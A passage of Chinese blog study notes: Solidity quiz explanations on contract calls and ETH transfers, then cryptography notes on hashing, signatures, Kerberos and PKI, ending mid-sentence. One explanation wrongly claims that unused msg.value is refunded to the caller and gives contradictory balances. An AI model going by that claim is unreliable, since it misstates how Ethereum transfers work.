结构体类型：可以使用 import { StructName } from “file.sol”; 来单独导入结构体定义。</strong></p><p><strong>因此，D. 以上都可以 是正确答案。</strong></p><p>* </p><p><img src="https://s2.loli.net/2024/11/18/BycbYiXFE24tvnG.png" alt="2.png"></p><p><strong>解析</strong></p><p>假设 SendETH 合约中 callETH 函数的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callETH(address payable _to) external payable &#123;</span><br><span class="line"></span><br><span class="line">  // 假设发送 1ETH 给 ReceiveETH 合约</span><br><span class="line"></span><br><span class="line">  (bool success, ) = _to.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">  require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，以下是执行步骤和各合约的 ETH 余额变化：</p><p> <strong>交易初始化</strong>：Vitalik 调用 SendETH 合约的 callETH 函数，没有设置 msg.value。SendETH 合约接收到 2 ETH。</p><p> <strong>转账执行</strong>：callETH 函数内部使用了 call{value: 1 ether}(“”)，向 ReceiveETH 合约发送 1 ETH。因此，ReceiveETH 合约将接收到 1 ETH，SendETH 合约的余额减少 1 ETH。</p><p><strong>最终余额</strong>：</p><p>o  SendETH 合约：2 ETH（初始接收） - 1 ETH（发送） &#x3D; 1 ETH</p><p>o  ReceiveETH 合约：接收 1 ETH</p><p>由于没有设置msg.value，执行完交易后，SendETH 合约的余额为 <strong>1 ETH</strong>，而 ReceiveETH 合约的余额为 <strong>1 ETH</strong>。</p><p><strong>如果设置了msg.value，则SendETH为0ETH，</strong></p><p>这是因为 msg.value 是直接随交易发送到 SendETH 合约的，以支付调用 callETH 函数的资金。这笔 2 ETH 会被发送到 SendETH 合约，但 SendETH 合约并不保留这 2 ETH，而是立即在 callETH 函数中使用其中的 1 ETH 进行转账，剩余的 1 ETH 也不被 SendETH 合约保留。</p><p>以下是更详细的解释：</p><ol><li><p><strong>初始交易的 2 ETH</strong>：Vitalik 发送的 msg.value 是 2 ETH，这笔资金在调用 SendETH 合约的 callETH 函数时传入。</p></li><li><p><strong>发送 1 ETH 给 ReceiveETH</strong>：callETH 函数中使用了 call{value: 1 ether}(“”) 向 ReceiveETH 合约转账 1 ETH。</p></li><li><p><strong>剩余的 1 ETH</strong>：由于 callETH 函数中并没有将剩余的 1 ETH 存入 SendETH 合约的余额（例如未将 msg.value - 1 ether 显式存入），交易结束时，这部分 1 ETH 会被直接退还给调用者（Vitalik），因为 Solidity 中的函数执行完毕后未被使用的 msg.value 会被退还。</p></li></ol><p><strong>总结</strong></p><p>因此，交易完成后：</p><p>·    SendETH 合约没有余额，余额为 <strong>0 ETH</strong></p><p>·    ReceiveETH 合约收到并保留了 1 ETH</p><ul><li><p>下列关于智能合约调用其他智能合约的说法，正确的一项是：</p><p> 选择一个答案</p><p> A. 智能合约调用其他智能合约这一功能，主要起到了方便代码复用的作用</p><p> B. 在智能合约A中调用智能合约B，比起从EOA直接调用智能合约B，要更节省gas </p><p> C. 智能合约B中可见性为internal的函数也可以被智能合约A调用</p></li></ul><p><strong>解析</strong></p><p>· <strong>选项 A 是正确的。智能合约调用其他智能合约确实可以方便代码复用。这样可以减少重复代码并提高合约的模块化，使开发更加灵活和高效。</strong></p><p><strong>· 选项 B 是不正确的。在智能合约 A 中调用智能合约 B 实际上比直接从外部账户（EOA）调用智能合约 B 消耗更多的 Gas，因为这涉及到更多的操作步骤（合约 A 需要发起外部调用），并没有节省 Gas 的效果。</strong></p><p><strong>· 选项 C 是不正确的。internal 可见性表示函数只能在同一个合约或继承的合约中调用，不能被其他合约直接调用。因此，合约 A 无法直接调用合约 B 中 internal 的函数。</strong></p><ul><li>下面哪种使用方式不正确？</li></ul><p>​A. address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”)); </p><p>​B. address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”)); </p><p>​C. address.call{gas: 1000000, value: 1 ether} </p><p>​D. address(nameReg).call{gas: 1000000, value: 1 ether}</p><p>​</p><p><strong>解析</strong></p><p>逐一分析</p><p> <strong>选项 A：address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p><p>o 这是正确的写法，使用了 .call{gas: …} 发送指定的 gas 量，并通过 abi.encodeWithSignature 来对函数调用参数进行编码。此调用会尝试在 nameReg 地址处调用 register(string) 函数，提供字符串 “MyName” 作为参数。</p><p><strong>选项 B：address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p><p>o 这是正确的写法，使用了 .call{value: …} 发送指定的 value（即 1 ether），并且使用了 abi.encodeWithSignature 对函数和参数进行编码。</p><p>o 该调用会在发送 1 ether 的情况下，尝试调用 nameReg 地址上的 register(string) 函数。</p><p> <strong>选项 C：address.call{gas: 1000000, value: 1 ether}</strong></p><p>o 这是不正确的写法。address.call{…} 的语法要求提供被调用的目标地址，而这里没有指定有效地址和编码的数据。正确写法应为 address(target).call{gas: …, value: …}(data)。</p><p>o 这里 address 作为数据类型使用是不对的，应该是一个具体的地址实例，比如 address(target)。</p><p> <strong>选项 D：address(nameReg).call{gas: 1000000, value: 1 ether}</strong></p><p>o 这是正确的写法，因为 address(nameReg).call{gas: …, value: …}(data) 提供了 gas 和 value，并调用 nameReg 这个合约地址。</p><p><strong>因此，C 是错误的使用方式，因为它缺少了有效的地址实例（目标地址）和调用的数据。</strong></p><p><img src="https://s2.loli.net/2024/11/18/EYM5s4byNx2dROt.png" alt="3.png"></p><p><strong>解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OtherContract other = OtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure><p>o 这种写法直接实例化了 OtherContract 合约。因为 OtherContract 合约实现了 IOtherContract 接口，这种写法允许我们调用 OtherContract 中的所有公共函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOtherContract other = IOtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure><p>o 这种写法使用了 IOtherContract 接口进行实例化，可以用来调用 IOtherContract 中声明的函数。只要 OtherContract 实现了 IOtherContract 接口，这种方式也是正确的。</p><p>因此，**(1) 和 (2) 均是正确的调用方式**，可以使用任意一种方法来调用合约。</p><p><img src="https://s2.loli.net/2024/11/18/lPv1sNgO5QoMCUn.png" alt="4.png"></p><p><strong>解析</strong></p><p><strong>· 选项 A：MyContract 是 OtherContract 的子类</strong></p><p><strong>o 不正确。MyContract 并没有继承 OtherContract，它只是实例化了 OtherContract 并通过地址直接调用它的函数，因此不构成继承关系。</strong></p><p><strong>· 选项 B：MyContract 是 IOtherContract 的一个实现</strong></p><p><strong>o 不正确。MyContract 也没有实现 IOtherContract 接口。它只是定义了与 OtherContract 交互的函数，而不是实现 IOtherContract 中的所有接口。</strong></p><p><strong>· 选项 C：MyContract 需要 0xd9145CCE52D386f254917e481eB44e9943F39138 的某种许可，才可以调用其中的函数</strong></p><p><strong>o 不正确。只要 OtherContract 中的函数是 external 或 public 且无访问权限限制，任何合约或外部账户都可以调用它。OtherContract 中的 setX 和 getX 都没有额外的权限控制。</strong></p><p><strong>· 选项 D：MyContract 的函数 call_setX 可以实现，这意味着 OtherContract 中 setX 的权限没有门槛，存在安全隐患</strong></p><p><strong>o 正确。OtherContract 的 setX 函数是 external 并且没有权限控制，因此任何合约或账户都可以调用并修改 _x 的值。这确实可能带来安全隐患，尤其是在 _x 变量值的更改可能影响合约逻辑的情况下。如果不希望外部随意调用，应该在 setX 函数中添加访问控制。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础二</title>
      <link href="/2024/11/10/%E9%93%BE%E5%AE%89%E5%9F%BA%E7%A1%802/"/>
      <url>/2024/11/10/%E9%93%BE%E5%AE%89%E5%9F%BA%E7%A1%802/</url>
      
        <content type="html"><![CDATA[<h2 id="四-数字签名与认证技术"><a href="#四-数字签名与认证技术" class="headerlink" title="四.数字签名与认证技术"></a>四.数字签名与认证技术</h2><h3 id="消息摘要算法："><a href="#消息摘要算法：" class="headerlink" title="消息摘要算法："></a>消息摘要算法：</h3><p>消息摘要是保证明文无法篡改、完整性的一种算法，消息摘要不是加密明文，也不是加密算法</p><ul><li>无论输入的消息有多长，计算出来的消息摘要的长度总是固定的。</li><li>消息摘要看起来是“随机的”。</li><li>一般地，只要输入的消息不同，对其进行摘要以后产生的摘要消息也必不相同</li><li>消息摘要函数是无陷门的单向函数，即只能进行正向的消息摘要而无法从摘要中恢复出任何的消息</li><li>好的摘要算法，没有人能从中找到“碰撞”，虽然“碰撞”是肯定存在的。</li></ul><h4 id="Hash函数："><a href="#Hash函数：" class="headerlink" title="Hash函数："></a>Hash函数：</h4><h5 id="Hash函数特点："><a href="#Hash函数特点：" class="headerlink" title="Hash函数特点："></a>Hash函数特点：</h5><p>（令h表示哈希函数，h满足以下条件）</p><p> 输入可以是任意长度的消息或文件<em>M</em>；</p><p> 输出长度是固定的；</p><p> 给定<em>h</em>和<em>M</em>，计算<em>h</em>(<em>M</em>)是容易的；</p><p> 给定<em>h</em>的描述，找两个不同的消息<em>M</em>1和<em>M</em>2，使得<em>h</em>(<em>M1</em>)<em>&#x3D;h</em>(M2)在计算上是不可行的。 </p><p><strong>Hash函数的安全性</strong>：在现有的计算资源下，找到一个碰撞是不可能的。</p><p>Hash函数在网络安全应用中，<strong>不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。</strong></p><p>主要Hash算法有MD2、MD4、<strong>MD5、SHA。</strong></p><p>其中，MD5能产生128比特长度的哈希值，它的使用广泛，常用于网络中文件的完整性检查。而SHA在美国政府中使用，作为安全哈希标准，SHA产生的哈希值比MD5长，有160比特。 </p><h3 id="数字签名："><a href="#数字签名：" class="headerlink" title="数字签名："></a>数字签名：</h3><p>数字签名(Digital Signature)是手写签名的电子模拟，是通过电子信息计算处理，产生的一段特殊字符串消息，该消息具有与手写签名一样的特点，<strong>是可信的、不可伪造的、不可重用的、不可抵赖的以及不可修改的。</strong></p><p>数字签名至少应满足以下三个条件：</p><p>　　n 签名者事后不能否认自己的签名；</p><p>　　n 接收者能验证签名，而任何其他人都不能伪造签名；</p><p>　　n当双方就签名的真伪发生争执时，第三方能解决双方之间发生的争执。</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>（1）<strong>直接方式的数字签名</strong></p><p>​  直接方式的数字签名只有通信双方参与，并假定接收一方知道发方的公钥。数字签名的形成方式可以用发方的私钥加密信息。 </p><p>  直接方式的数字签名有一公共弱点，即方案的有效性取决于发方密钥的安全性。 </p><p>（2）<strong>具有仲裁方式的数字签名</strong></p><p>​发方A对发往收方B的信息签名后，将信息及其签名先发给仲裁者C，C对信息及其签名验证完成后，再连同一个表示已通过验证的指令一起发往收方B。此时由于C的存在，A无法对自己发出的信息予以否认</p><h4 id="特点-组成："><a href="#特点-组成：" class="headerlink" title="特点&amp;组成："></a>特点&amp;组成：</h4><p>一个数字签名方案一般由签名算法和验证算法组成。<strong>签名</strong>算法的<strong>密钥是秘密的</strong>，只有<strong>签名人掌握</strong>；而<strong>验证算法则是公开的</strong>，以便他人验证。</p><p>签名与加密很相似，一般是签名者利用秘密密钥(私钥)对需签名的数据进行加密，验证方利用签名者的公开密钥(公钥)对签名数据做解密运算。<strong>签名与加密的不同之处在于，加密的目的是保护信息不被非授权用户访问，而签名的目的是让消息接收者确信信息的发送者是谁，信息是否被他人篡改。</strong></p><h4 id="数字签名基本流程："><a href="#数字签名基本流程：" class="headerlink" title="数字签名基本流程："></a>数字签名基本流程：</h4><p>（熟悉的Alice和Bob又出现了）</p><p>假设Alice需要签名<strong>发送一份电子合同文件给Bob</strong>。Alice的签名步骤如下： </p><ul><li><p>　　第一步，Alice使用Hash函数将电子合同文件生成一个消息摘要。</p></li><li><p>　　第二步，Alice使用自己的私钥，把消息摘要加密，形成一个数字签名。</p></li><li><p>　　第三步，Alice把电子合同文件和数字签名一同发送给Bob。</p><p> Bob收到Alice发送的电子合同文件及数字签名后，要<strong>验证电子合同文件是Alice所认可</strong>的，验证步骤如下：</p></li><li><p>​    第一步，Bob使用与Alice相同的Hash算法，计算出所收到电子合同文件的消息摘要。</p></li><li><p>　第二步，Bob使用Alice的公钥，解密来自Alice的加密消息摘要，恢复出Alice原来的消息摘要。</p></li><li><p>　第三步，Bob比较自己产生的消息摘要和恢复出来的消息摘要之间的异同。若两个消息摘要相同，则表明电子合同文件来自Alice。如果两个消息摘要的比较结果不一致，则表明电子合同文件已被篡改。</p></li></ul><p><img src="https://s2.loli.net/2024/11/10/Uz16xo34A2vQafu.png" alt="1.png"></p><h3 id="数字证书（数字标识）："><a href="#数字证书（数字标识）：" class="headerlink" title="数字证书（数字标识）："></a>数字证书（<strong>数字标识</strong>）：</h3><ul><li><p><strong>提供了一种在网络上身份验证的方式，是用来标志和证明网络通信双方身份的数字信息文件</strong>，与司机驾照或日常生活中的身份证相似。</p></li><li><p>由权威公正的第三方机构即CA中心签发。</p></li><li><p>以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性，从而保障网络应用的安全性。</p></li><li><p>采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私钥才能解密。</p></li><li><p><strong>使用</strong>：当发送一份保密文件时，发送方使用接收方的公钥对数据加密，而接收方则使用自己的私钥解密</p></li><li><p>数字证书能够确认以下两点：</p><p>  ①保证信息是由签名者自己签名发送的，签名者不能否认或难以否认。</p><p>  ②保证信息自签发后到收到为止未曾作过任何修改，签发的文件是真实文件。</p></li></ul><h3 id="认证及认证模型："><a href="#认证及认证模型：" class="headerlink" title="认证及认证模型："></a>认证及认证模型：</h3><p><strong>认证（Authentication）是指核实真实身份的过程，是防止主动攻击的重要技术之一。</strong>计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。</p><h4 id="认证的用途"><a href="#认证的用途" class="headerlink" title="认证的用途"></a>认证的用途</h4><p>主要用途有三方面：</p><p>（1）验证网络资源访问者的身份，给网络系统访问授权提供支持服务。</p><p>（2）验证网络信息的发送者和接收者的真实性，防止假冒。</p><p>（3）验证网络信息的完整性，防止篡改、重放或延迟。</p><h4 id="认证信息类型"><a href="#认证信息类型" class="headerlink" title="认证信息类型"></a>认证信息类型</h4><p>常用的鉴别信息主要有四种：</p><p>（1）所知道的<strong>秘密</strong>，如用户口令、PIN (Personal Identification Number)。</p><p>（2）所拥有的<strong>实物</strong>，一般是不可伪造的设备，如智能卡、磁卡等。</p><p>（3）<strong>生物特征信息</strong>，如指纹、声音、视网膜等。</p><p>（4）上下文信息，就是认证实体所处的<strong>环境信息</strong>、地理位置、时间等，例如IP地址等。 </p><h4 id="认证方法分类"><a href="#认证方法分类" class="headerlink" title="认证方法分类"></a>认证方法分类</h4><ol><li><h5 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a><strong>单向认证</strong></h5></li></ol><p> 单向认证是指在网络服务认证过程中，服务方对客户方进行单方面的鉴别，而客户方不需要识别服务方的身份（账号密码）。</p><p><strong>认证过程：</strong></p><p>第一步，客户方向服务器发出访问请求； </p><p>第二步，服务器要求客户方输入ID；</p><p>第三步，客户方向服务器输入ID；</p><p>第四步，服务器要求客户方输入密码；</p><p>第五步，客户方向服务器输入密码；</p><p>第六步，服务器验证ID和密码，如果匹配则允许客户进入系统访问。 </p><ol start="2"><li><h5 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a><strong>双向认证</strong></h5>双向认证是指在网络服务认证过程中，不仅服务方对客户方要进行鉴别，而且客户方也要鉴别服务方的身份。</li></ol><p><strong>认证过程：</strong></p><p>一到六步与单向的过程相同</p><p>第七步，客户提示服务器输入密码；</p><p>第八步，服务器按客户要求输入密码；</p><p>第九步，客户验证服务器。</p><ol start="3"><li><p><strong>三方来实现。</strong></p><p>第三方不仅负责维护认证信息，而且还负责验证双方的身份。<strong>每个用户都把自己的ID和密码发送给可信第三方，由第三方负责认证过程</strong>。此方法兼顾了安全性和密码存储的简单易行性。</p></li></ol><h4 id="认证实现技术："><a href="#认证实现技术：" class="headerlink" title="认证实现技术："></a>认证实现技术：</h4><ol><li><p>静态密码: 用户的密码是由用户自己设定的(就是我们平时那个密码)</p></li><li><p>智能卡（IC卡）：一种内置集成电路的芯片，芯片中存有与用户身份相关的数据</p></li><li><p>短信密码：手机短信形式请求包含6位随机数的动态密码（安全、普及、易收费和维护）</p></li><li><p>动态口令牌：生成动态密码的终端</p></li><li><p>USB KEY：软硬件相结合、一次一密的强双因子认证模式</p></li><li><p>数字签名：数字签名又称电子加密，可以区分真实数据与伪造、被篡改过的数据</p></li><li><p>生物识别技术：通过可测量的身体或行为等生物特征进行身份认证的一种技术</p></li></ol><p> （身体特征包括：指纹、掌型、视网膜、虹膜、人体气味、脸型、手的血管和DNA等；）</p><p> （行为特征包括：签名、语音、行走步态等）</p><ol start="8"><li><p>双因素身份认证：两种认证方法结合</p></li><li><p>身份的零知识证明：能够不传输这些信息身份进行认证的方法</p></li></ol><p>（ps: 目前部分学者将视网膜识别、虹膜识别和指纹识别等归为高级生物识别技术；将掌型识别、脸型识别、语音识别和签名识别等归为次级生物识别技术；将血管纹理识别、人体气味识别、DNA识别等归为“深奥的”生物识别技术）</p><h4 id="Kerberos技术"><a href="#Kerberos技术" class="headerlink" title="Kerberos技术"></a>Kerberos技术</h4><p>Kerberos的基本原理是<strong>利用对称密码技术</strong>，<strong>使用可信的第三方（刚刚的第三个方法）来认证</strong>服务器的用户身份，并在用户和服务器之间建立安全信道。(<strong>就是基于对称密码技术在网络上实施认证的一种服务协议，它允许一台工作站通过交换加密消息在非安全网络上与另一台工作站相互证明身份</strong>，一旦试图登录上网的用户身份得到验证，Kerberos协议就会给这两台工作站提供密钥，并通过使用密钥和加密算法为用户间的通信加密以进行安全的通信)</p><p>Kerberos系统涉及到</p><h5 id="四个基本实体："><a href="#四个基本实体：" class="headerlink" title="四个基本实体："></a><strong>四个基本实体：</strong></h5><ul><li>　　<strong>Kerberos客户机：</strong>用户用来访问服务器的设备。</li><li>　　<strong>AS</strong>(Authentication Server)：为用户分发TGT(Ticket Granting Ticket)的服务器。用户使用TGT(Ticket Granting Ticket)向TGS(Ticket Granting Server)证明自己的身份。</li><li>　　<strong>TGS</strong>(Ticket Granting Server)：为用户分发到最终目的票据的服务器，用户使用这个票据向自己要求提供服务的服务器证明自己的身份。</li><li>　　<strong>应用服务器</strong>(Application Server)：为用户提供特定服务。</li></ul><h5 id="设计基本思路："><a href="#设计基本思路：" class="headerlink" title="设计基本思路："></a><strong>设计基本思路：</strong></h5><p>①使用一个（或一组）独立的认证服务器（AS—Authentication Server），来为网络中的客户提供身份认证服务；</p><p>②**认证服务器 (AS)**，用户口令由 AS 保存在数据库中；</p><p>③AS 与每个服务器共享一个唯一的保密密钥（已被安全分发）</p><p><img src="https://s2.loli.net/2024/11/10/OqAMisdtBW9N8H3.png" alt="4.png"></p><h5 id="设计目标："><a href="#设计目标：" class="headerlink" title="设计目标："></a><strong>设计目标：</strong></h5><p>①安全性：能够有效防止攻击者假扮成另一个合法的授权用户。</p><p>②可靠性：分布式服务器体系结构，提供相互备份。</p><p>③对用户透明性</p><p>④可伸缩：能够支持大数量的客户和服务器。</p><p>在实际使用中，会遇到如下问题：</p><p>①用户希望输入口令的次数最少。</p><p>②口令以明文传送会被窃听。</p><p>对于这样的问题，Kerberos的解决办法是：</p><p> ①票据重用（ticket reusable）。</p><p> ②引入票据许可服务器（TGS - ticket-granting server）。用于向用户分发服务器的访问票据；认证服务器 AS 并不直接向客户发放访问应用服务器的票据，而是由 TGS 服务器来向客户发放。</p><h5 id="票据："><a href="#票据：" class="headerlink" title="票据："></a><strong>票据：</strong></h5><p>在Kerberos系统中，<strong>票据</strong>(Ticket)是用于安全传递用户身份所需要的信息的集合。<strong>它不仅包含该用户的身份，而且还包含其他一些相关的信息。一般来说，它主要包括客户方Principal、目的服务方Principal、客户方IP地址、时间戳(分发该Ticket的时间)、Ticket的生存期以及会话密钥等内容。</strong>通常将AS和TGS统称为KDC(Key Distribution Center)。</p><p><img src="https://s2.loli.net/2024/11/10/Ym8TpQE9Mzi5Jt1.png" alt="2.png"></p><p><img src="https://s2.loli.net/2024/11/10/TNELxgQjFmk3pl4.png" alt="3.png"></p><h5 id="工作流程："><a href="#工作流程：" class="headerlink" title="工作流程："></a>工作流程：</h5><ul><li>第一步，<strong>Kerberos客户向认证服务器AS申请票据TGT。</strong></li><li>第二步，（AS在认证数据库检查、确认Kerberos客户，并产生一个会话密钥，同时使用Kerberos客户的秘密密钥对会话密钥进行加密，然后）<strong>生成一个票据TGT，AS生成TGT后，把TGT发送给Kerberos客户</strong></li><li>第三步，（Kerberos客户收到AS 发来的TGT后，使用自己的秘密密钥进行）解密，<strong>得到会话密钥，然后利用解密的信息重新构造认证请求单，向TGS发送请求，申请访问</strong>应用服务器AP所需要的<strong>票据</strong>(Ticket)。</li><li>第四步， TGS使用其秘密密钥<strong>对TGT进行解密</strong>，同时使用TGT中的会话密钥<strong>对</strong>Kerberos客户的<strong>请求认证单信息进行解密</strong>，并将解密后的认证单信息与TGT中的信息进行<strong>比较</strong>。然后，TGS生成新的会话密钥以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。<strong>最后，生成一个票据</strong>，它由Kerberos客户实体名、地址、时间戳、限制时间、会话密钥组成。<strong>TGS生成TGT完毕后，把TGT发送给Kerberos客户。</strong></li><li>第五步，Kerberos客户收到TGS的响应后，将获得与应用服务器共享的会话密钥。与此同时，Kerberos客户生成一个新的用于访问应用服务器的认证单，并用与应用服务器共享的会话密钥加密，然后与TGS发送来的票据一并传送到应用服务器。</li><li>第六步，应用服务器确认请求。</li></ul><p><strong>优缺点</strong>：</p><p>主要优点是利用相对便宜的技术提供了较好的保护水平</p><p>缺点主要体现在以下3个方面：</p><p>  ① 需要具有很高利用率的可信在线认证服务器（至少在物理上是安全的）；</p><p>  ②重放检测依赖于时间戳，这意味着需要同步和安全的时钟；</p><p>  ③ 如果认证过程中的密钥受到威胁，那么传输在使用该密钥进行认证的任何会话过程中的所有被保护的数据都将受到威胁。</p><h2 id="五-PKI-技术"><a href="#五-PKI-技术" class="headerlink" title="五.PKI 技术"></a>五.PKI 技术</h2><h3 id="基本概念和作用："><a href="#基本概念和作用：" class="headerlink" title="基本概念和作用："></a>基本概念和作用：</h3><p>所谓PKI(Pubic Key Infrastructure)即公钥基础设施，<strong>支持公钥的管理，并提供保密性、完整性、真实性以及可追究性安全服务的具有普适性的安全基础设施</strong></p><ol><li>可提供安全服务</li><li>支持公钥的管理</li><li>利用公钥和其他加密技术的结合。</li></ol><h3 id="主要研究内容及主要服务"><a href="#主要研究内容及主要服务" class="headerlink" title="主要研究内容及主要服务"></a>主要研究内容及主要服务</h3><ul><li>其在计算机和网络环境中得到了广泛应用：如可信计算机的本机认证、网上证券、网上保险；网上办公、网上税务、网上工商、网上海关、网上医院等。</li></ul><h4 id="主要研究内容："><a href="#主要研究内容：" class="headerlink" title="主要研究内容："></a>主要研究内容：</h4><ul><li><p>PKI提供公钥加密和数字签名服务的系统或平台，目的是为了<strong>管理密钥和证书</strong>。通过数字证书，PKI很好的<strong>证明了公钥属于谁</strong>。</p></li><li><p>技术的研究对象包括：数字证书，颁发数字证书的证书认证中心（CA），持有证书的证书持有者和使用证书服务的证书用户等</p></li></ul><h4 id="主要安全服务："><a href="#主要安全服务：" class="headerlink" title="主要安全服务："></a>主要安全服务：</h4><p>1.<strong>认证</strong>——向一个实体确认另一个实体确实是他自己。</p><p>2.<strong>完整性</strong>—— 向一个实体确保数据没有被有意或无意的修改。</p><p>3.<strong>机密性</strong>——向一个实体确保除了接收者，无人能读懂数据的关键部分。</p><p>4.<strong>不可否认</strong>性——通过数字签名机制来提供该服务的。</p><h3 id="pkl的基本结构"><a href="#pkl的基本结构" class="headerlink" title="pkl的基本结构"></a>pkl的基本结构</h3><p><strong>PKI体系结构一般由认证机构和各种终端实体组成</strong><br>（pkl体系建立首先应该关注用户使用证书及相关服务的全面性和便利性）</p><p>建立和设计一个PKI体系必须保证</p><h4 id="相关服务功能的实现"><a href="#相关服务功能的实现" class="headerlink" title="相关服务功能的实现"></a><strong>相关服务功能的实现</strong></h4><p>• 用户身份的可信认证<br>• 制定完整的证书管理政策<br>• 建立高可信度的认证CA中心<br>• 用户实体属性的管理<br>• 用户身份的隐私保护<br>• 证书作废列表处理<br>• 认证机构CA为用户提供证书库及CRL服务的管理</p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a><strong>组成</strong></h4><ol><li>Pkl策略</li><li>软硬件系统</li><li>证书机构ca</li><li>注册机构ca</li><li>证书发布系统</li><li>pkl应用</li></ol><h3 id="pkl与数字证书"><a href="#pkl与数字证书" class="headerlink" title="pkl与数字证书"></a>pkl与数字证书</h3><p><strong>数字证书是PKI最基本的元素</strong>，也是承载PKI安全服务的最重要的载体。 在PKI体系中,用户就是通过使用数字证书来保障信息的传输的保密性、发送信息的不<br>可否认性、交易者身份的确定性等安全特性。 数字证书是PKI的核心元素，由权威的、可信认的、公证的第三方机构CA所签发</p><h4 id="数字证书的补充"><a href="#数字证书的补充" class="headerlink" title="数字证书的补充"></a>数字证书的补充</h4><p>用户证书具有下列形式:<br>正在载入… CA《A》&#x3D;CA{V，SN，AI，CA，UCA，A，UA，Ap，TA}<br>这里:<br>V——证书版本号。<br>SN一—证书序列号。<br>AI——用于对证书进行签名的算法的标识符。<br>UCA——CA可选的惟一标识符。<br>UA——用户A可选的唯一标识符。</p><h4 id="数字证书-密钥的生命周期"><a href="#数字证书-密钥的生命周期" class="headerlink" title="数字证书&#x2F;密钥的生命周期"></a>数字证书&#x2F;密钥的生命周期</h4><p><strong>主要三个阶段：</strong></p><ul><li>证书初始化注册阶段</li><li>颁发投入工作阶段</li><li>撤消阶段</li></ul><p><img src="https://s2.loli.net/2024/11/10/joKpP4BzebIltRJ.png" alt="5.png"></p><h4 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h4><ol><li>证书拆封</li></ol><p>用于验证发行者ca的公钥能否正确解开客户实体——证书中的“发行者的数字签名”【即证明该证书是否为可信任的第三方ca机构所签发】<br>2. 序列号验证<br>检查实体证书中的签名实体序列号是否与签发者证书的序列号一致，从而验证证书真伪。<br>3. 有效期验证<br>检查用户证书使用的日期是否合法，有无过期。<br>4.撤销列表查询</p><h4 id="pkl互联"><a href="#pkl互联" class="headerlink" title="pkl互联"></a>pkl互联</h4><p>pkl互通性必须建立在网络互通的基础上</p><p><strong>PKI在全球互通可以有两种实现途径:</strong><br>● 各PKI体系的根CA交叉认证。（一般实现方式）<br>● 建立一个全球性的统一根CA，为各PKI体系的根证书颁发证书。（实现较困难）</p><h4 id="交叉互联"><a href="#交叉互联" class="headerlink" title="交叉互联"></a>交叉互联</h4><p>双子树结构<br><img src="https://s2.loli.net/2024/11/10/PpduB2AaFN54J6K.jpg" alt="6.jpg"></p><h3 id="pkl应用实例"><a href="#pkl应用实例" class="headerlink" title="pkl应用实例"></a>pkl应用实例</h3><h4 id="虚拟专用网络（VPN）"><a href="#虚拟专用网络（VPN）" class="headerlink" title="虚拟专用网络（VPN）"></a>虚拟专用网络（VPN）</h4><p><strong>定义</strong><br>  <strong>架构VPN的基础：基于pkl技术的IPSec协议</strong><br>  是一种架构在公用通信基础设 施上的专用数据通信网络，利用网络层安全协议(尤其是IPSec)和建立在PKI上 的加密与签名技术来获得私有性。<br>  <strong>口令</strong><br>  用来防止未授权的个人直接访问敏感数据<br>  <strong>防火墙</strong><br>  用来防止公司以外的未授权个人访问公司内部信息</p><p>  基于PKI技术的IPSec协议现在已经成为架构VPN 的基础，它可以为路由器之 间、防火墙之间或者路由器和防火墙之间提供经过加密和认证的通信。虽然它的 实现会复杂一些，但其安全性比其他协议都完善得多。<strong>由于IPSec是IP层上的协 议，因此很容易在全世界范围内形成一种规范，具有非常好的通用性，而且IPSec本身就支持面向未来的协议——IPv6</strong>。</p><h4 id="安全电子邮件——-PKI-与S-MIME"><a href="#安全电子邮件——-PKI-与S-MIME" class="headerlink" title="安全电子邮件—— PKI 与S&#x2F;MIME"></a>安全电子邮件—— PKI 与S&#x2F;MIME</h4><p><strong>利用数字证书和私钥，用户可以对他所发的邮件进行数字签名，这样就可以获得认证、完整性和不可否认性，</strong>如果证书是由其所属公司或某一可信第三方颁发的，收到邮件的人就可以信任该邮件的来源，无论他是否认识发邮件的人；另一方面，在政策和法律允许的情况下，用加密的方法就可以保障信息的保密性。</p><p>目前发展很快的安全电子邮件协议是S&#x2F;MIME ，是允许发送加密和有签名邮件的协议。主要依赖技术是pkl。</p><h4 id="Web安全——PKI-与-SSL"><a href="#Web安全——PKI-与-SSL" class="headerlink" title="Web安全——PKI 与 SSL"></a>Web安全——PKI 与 SSL</h4><p>无论是IE还是其他浏览器，都支持SSL协议（The Secure Sockets 